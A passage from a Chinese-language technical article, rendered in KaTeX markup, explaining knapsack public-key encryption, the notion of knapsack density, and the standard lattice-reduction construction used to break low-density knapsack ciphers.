63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9084399999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span></span></span></span></span></p><ul><li>这样我们加密后的密文就可以写成向量的点乘形式，如下式子</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><mover accent="true"><mi>b</mi><mo>⃗</mo></mover><mo separator="true">⋅</mo><mover accent="true"><mi>v</mi><mo>⃗</mo></mover><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><msub><mi>b</mi><mn>3</mn></msub><msub><mi>v</mi><mn>3</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>b</mi><mi>n</mi></msub><msub><mi>v</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">c = \vec{b}·\vec{v}=b_1v_1+b_2v_2+b_3v_3+...+b_nv_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9774399999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9774399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><strong>格攻击背包加密</strong></p><ul><li><p>由于私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一个超递增序列，所以这就使得这个加密体制存在一定被破译的分险，并且之后由于<strong>格基规约等格技术</strong>的发展，许多背包问题的变种都被证明在实际参数下是不太安全的，这些背包加密被破解的原因基本上是<strong>特殊结构</strong>或者<strong>低密度</strong>。除了 <strong>Okamoto-Tanaka-Uchiyama (OTU) 量子背包密码体制</strong>目前还没有被攻击。</p></li><li><p>在读论文的时候，有一些概念需要先介绍一下，以便于我们分析背包的复杂度等，最终目的都是帮助我们理解和使用格对背包密码进行攻击。</p></li><li><p>概念：背包密度<strong>d</strong></p></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo>=</mo><mfrac><mi>n</mi><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>A</mi></mrow></mfrac><mo separator="true">,</mo><mtext>其中</mtext><mi>A</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">{</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">d  = \frac{n}{log_2A},其中A = max\{a_1,a_2,...,a_n\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.9880000000000002em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></span></p><ul><li>对于一个背包密码，我们想要判断它是否能被破解，我们首要的就是看这个背包密度<strong>d</strong><ul><li>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>&lt;</mo><mn>0.9408...</mn></mrow><annotation encoding="application/x-tex">d&lt;0.9408...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mord">4</span><span class="mord">0</span><span class="mord">8</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>时，这个背包密码就可以被格基规约攻击。</li><li>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>时，可以使用基于格规约的变体攻击可以成功碰撞</li><li>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.9408...</mn><mo>&lt;</mo><mi>d</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0.9408...&lt;d&lt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mord">4</span><span class="mord">0</span><span class="mord">8</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的时候，并没有比较好的格规约的攻击方式，可能有一些算法可以解特定情况，这种情况被称为<strong>困难背包</strong>问题</li></ul></li></ul><p>对于背包加密，我们可以构造出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>维向量，记这些向量为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，注意这里的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><strong>没有限制为超递增序列</strong></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>v</mi><mi>i</mi></msub><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><msub><mi>b</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi>N</mi><msub><mi>a</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>b</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi>N</mi><msub><mi>a</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mi>N</mi><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>b</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo separator="true">,</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo separator="true">,</mo><mi>N</mi><mi>c</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">c = \sum_{i=1}^nv_ia_i\\b_1 = (1,0,...,0,Na_1)\\b_2 = (0,1,...,0,Na_2)\\......\\b_n = (0,0,...,1,Na_n)\\b_{n+1} = (\frac{1}{2},\frac{1}{2},...,\frac{1}{2},Nc)\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" 